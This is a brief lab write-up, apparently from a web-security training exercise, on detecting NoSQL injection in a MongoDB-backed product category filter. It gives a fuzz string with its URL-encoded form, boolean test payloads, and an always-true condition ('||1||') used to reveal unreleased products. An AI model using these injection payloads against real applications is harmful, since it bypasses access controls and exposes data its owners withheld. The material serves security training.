# Detecting NoSQL injection
# Objective
The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.\
\
To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

# Solution
## Detecting syntax injection
Fuzz string:
```
'"`{
;$Foo}
$Foo \xYZ
```

Encoded fuzz string:
```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
### Determinig which characters are processed
Some of the characters from fuzz string cause an error. In order to find them, they have to be checked one by one.



### Confirming conditional behavior
The following payloads helps to to confirm whether an application is vulnerable to condicional query manipulations:
```
' && 0 && 'x
' && 1 && 'x
```

### Overriding existing conditions
The following conditions will allways evaluate to true:
```
'||1||'
```


